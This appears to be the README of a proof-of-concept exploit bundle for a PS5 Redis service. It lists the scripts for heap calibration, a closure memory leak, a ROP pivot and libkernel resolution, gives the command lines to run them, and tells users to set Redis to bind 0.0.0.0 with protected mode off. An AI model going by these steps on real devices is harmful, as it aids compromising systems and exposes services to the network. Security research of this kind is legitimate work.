[README.md](https://github.com/user-attachments/files/26852203/README.md)
# PS5 Redis 3.00 Native ROP PoC Source Bundle

This folder contains the minimal Python source files needed to run the Redis
escape proof-of-concept against the PS5 Redis service.

Default target:
```text
YOU MUST CHANGE YOUR REDIS.CONF FILE YOU NEED TO EDIT IP TO "bind 0.0.0.0" AND "protected-mode no"
```
```text
PS5IP:1003
```

No third-party Python packages are required. The scripts use only Python
standard library modules.

## Files

```text
poc_redis_300_native_rop.py
```

Main runner. Use this for the actual PoC modes such as `notify`, `libkernel`,
and the other native ROP/syscall test modes.

```text
redis_hll_calibration_sweep.py
```

Calibration-only helper. Use this first when the PoC starts failing with
`ERROR: B calibration failed`. It finds the current working `--layout-fillers`
value for the Redis process heap state.

```text
redis_hll_prespray_cclosure_read.py
```

Internal stage launched by the main runner. It performs the CClosure read,
recovers the eboot base, and prepares dispatch state.

```text
redis_hll_prespray_module_pivot.py
```

Internal pivot and dispatch support. It builds the module-object pivot and ROP
dispatch structures used by the main runner.

```text
redis_hll_guarded_probe.py
```

Low-level Redis RESP, HLL, calibration, cleanup, and helper routines.

```text
redis_hll_cclosure_leak.py
```

Small helper module used by the CClosure read stage.

## Typical Usage

Run everything from this directory:

```powershell
cd downloads\redis_escape_source
```

First, find the current working heap filler:

```powershell
python .\redis_hll_calibration_sweep.py --attempts 1 --fillers 0..120 --stop-on-hit
```

The output will print a line like:

```text
HIT filler=99 cal_byte=8618 flags_reg=-16492 changes=1
```

Use that `filler` value in the main PoC.

Notification proof:

```powershell
python .\poc_redis_300_native_rop.py --mode notify --fast --attempts 1 --layout-fillers 99 --eggs 512 --notify-text "Redis escape proof" --out-dir .\poc_runs\notify_f99
```

Libkernel resolution:

```powershell
python .\poc_redis_300_native_rop.py --mode libkernel --fast --attempts 1 --layout-fillers 99 --eggs 512 --attempt-timeout 240 --out-dir .\poc_runs\libkernel_f99
```

If calibration drifts again, rerun:

```powershell
python .\redis_hll_calibration_sweep.py --attempts 1 --fillers 0..120 --stop-on-hit
```

Then replace `--layout-fillers 99` with the newly reported value.

## Notes

`B calibration failed` means the HLL write did not land in the expected Redis
heap object for that layout. It does not necessarily mean the PoC source is
broken. The current Redis process heap state may require a different
`--layout-fillers` value.

The old stable fillers were often:

```text
15,16,14
```

The current observed working filler was:

```text
99
```

## Dependency Graph

```text
poc_redis_300_native_rop.py
  imports redis_hll_guarded_probe.py
  launches redis_hll_prespray_cclosure_read.py

redis_hll_prespray_cclosure_read.py
  imports redis_hll_guarded_probe.py
  imports redis_hll_cclosure_leak.py
  imports redis_hll_prespray_module_pivot.py

redis_hll_prespray_module_pivot.py
  imports redis_hll_guarded_probe.py

redis_hll_cclosure_leak.py
  imports redis_hll_guarded_probe.py

redis_hll_calibration_sweep.py
  imports redis_hll_guarded_probe.py
```
